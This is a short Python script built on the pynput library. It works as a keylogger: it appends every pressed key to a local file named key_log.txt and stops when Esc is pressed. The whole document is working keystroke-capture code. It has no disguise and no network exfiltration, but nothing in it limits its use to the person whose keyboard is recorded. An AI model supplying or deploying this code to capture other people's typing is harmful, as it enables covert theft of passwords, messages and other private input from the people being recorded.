from pynput.keyboard import Key, Listener

# Define the log file where keystrokes will be saved
log_file = "key_log.txt"

# Function to write the pressed key to the log file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            # Write the key to the file, removing quotes for normal keys
            f.write(str(key).replace("'", "") + " ")
    except Exception as e:
        print(f"Error: {e}")

# Function to handle key releases (you can customize this if needed)
def on_release(key):
    # If 'Esc' is pressed, stop the listener (useful for terminating the logger)
    if key == Key.esc:
        return False

# Start the keylogger listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
